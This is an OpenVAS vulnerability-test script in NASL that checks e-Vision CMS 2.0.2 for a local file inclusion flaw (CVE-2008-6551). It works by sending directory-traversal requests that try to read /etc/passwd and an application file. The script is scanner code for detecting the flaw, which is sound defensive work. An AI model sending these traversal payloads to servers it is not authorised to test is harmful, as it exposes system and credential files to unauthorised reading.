###############################################################################
# OpenVAS Vulnerability Test
# $Id: e-Vision_cms_multiple_local_file_include.nasl 15 2013-10-27 12:49:54Z jan $
#
# e-Vision CMS Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "e-Vision CMS is prone to multiple local file-include vulnerabilities
  because it fails to properly sanitize user-supplied input.

  An attacker can exploit these vulnerabilities using
  directory-traversal strings to view local files and execute local
  scripts within the context of the webserver process. A successful
  attack can allow the attacker to obtain sensitive information or
  gain unauthorized access to an affected computer in the context of
  the vulnerable server.

  e-Vision CMS 2.0.2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100054);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-6551");
 script_bugtraq_id(32180);
 script_tag(name:"risk_factor", value:"High");

 script_name("e-Vision CMS Multiple Local File Include Vulnerabilities");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if e-Vision CMS is vulnerable to multiple Local File Include");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/32180");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list("/evision","/cms", cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;

 if ( egrep(pattern:"root:.*:0:[01]:.*", string: buf) )
 	{    
       	  security_hole(port:port);
          exit(0);
        } 
        else {
         #/etc/passwd could not be read, try the e-vision File. 
	 url = string(d, "/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00");
	 req = http_get(item:url, port:port);
	 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
	 if( buf == NULL )continue;
	
	 if ( 
	      egrep(pattern:".*Ultimate client-side JavaScript client sniff\..*", string: buf) 
	    )
	  {
	    security_hole(port:port); # who is the lamer now?
	    exit(0);
	  }
	}  
}

exit(0);
